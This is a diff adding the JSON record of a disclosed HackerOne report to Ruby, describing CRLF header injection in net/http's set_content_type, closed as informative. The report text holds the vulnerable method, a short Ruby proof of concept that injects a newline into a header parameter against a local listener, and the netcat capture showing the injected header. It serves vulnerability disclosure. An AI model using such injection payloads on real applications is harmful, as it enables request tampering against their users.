@@ -1,0 +1,132 @@
+{
+  "id": 1168205,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTY4MjA1",
+  "url": "https://hackerone.com/reports/1168205",
+  "title": "'net/http': HTTP Header Injection in the set_content_type method",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "high",
+  "readable_substate": "Informative",
+  "created_at": "2021-04-19T09:25:39.912Z",
+  "submitted_at": "2021-04-19T09:25:40.010Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "sighook",
+    "url": "/sighook",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/8bTs1ocGqLJRNZAWnFyrSfqK/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 7724,
+    "url": "https://hackerone.com/ruby",
+    "handle": "ruby",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Ruby",
+      "twitter_handle": "",
+      "website": "https://www.ruby-lang.org",
+      "about": "A Programmer's Best Friend"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2022-02-04T06:31:47.596Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-10-22T16:33:14.652Z",
+  "team_member_agreed_on_going_public_at": "2022-02-04T06:31:47.497Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "The set\\_content\\_type's parameter is not filtered to prevent the injection from altering the entire request.\n\nThe vulnerable code:\n```ruby\n  def set_content_type(type, params = {})\n    @header['content-type'] = [type + params.map{|k,v|\"; #{k}=#{v}\"}.join('')]\n  end\n```\n\n# PoC\n\n1.\n```ruby\nrequire 'net/http'\n\nuri = URI('http://127.0.0.1:8080')\nreq = Net::HTTP::Post.new(uri)\nreq.set_content_type('text/html', \"charset\" => \"iso-8859-1\\nHeader:Inject\")\n\nresp = Net::HTTP.start(uri.hostname, uri.port) do |http|\n  http.request(req)\nend\n```\n\n2.\n```\n$ nc -lvp 8080\nListening on 0.0.0.0 8080\nConnection received on localhost 57620\nPOST / HTTP/1.1\nAccept-Encoding: gzip;q=1.0,deflate;q=0.6,identity;q=0.3\nAccept: */*\nUser-Agent: Ruby\nHost: 127.0.0.1:8080\nContent-Type: text/html; charset=iso-8859-1\nHeader:Inject # <<<<<<<<\nContent-Length: 0\n```\n\nI set the same severity as [CVE-2020-26116](https://nvd.nist.gov/vuln/detail/CVE-2020-26116) has.\n\n## Impact\n\nIn web applications a CRLF injection can have severe impacts, depending on what the application does with single items. Impacts can range from information disclosure to code execution, a direct impact web application security vulnerability.",
+  "weakness": {
+    "id": 69,
+    "name": "CRLF Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 9,
+  "voters": [
+    "cxzer0",
+    "foobar7",
+    "kaulse",
+    "pr0f0x01",
+    "sign3tsh3l1",
+    "ab2pentest",
+    "meispi",
+    "audifinds",
+    "anton_ivanov"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.2,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "low",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 28212,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/ruby/ruby",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
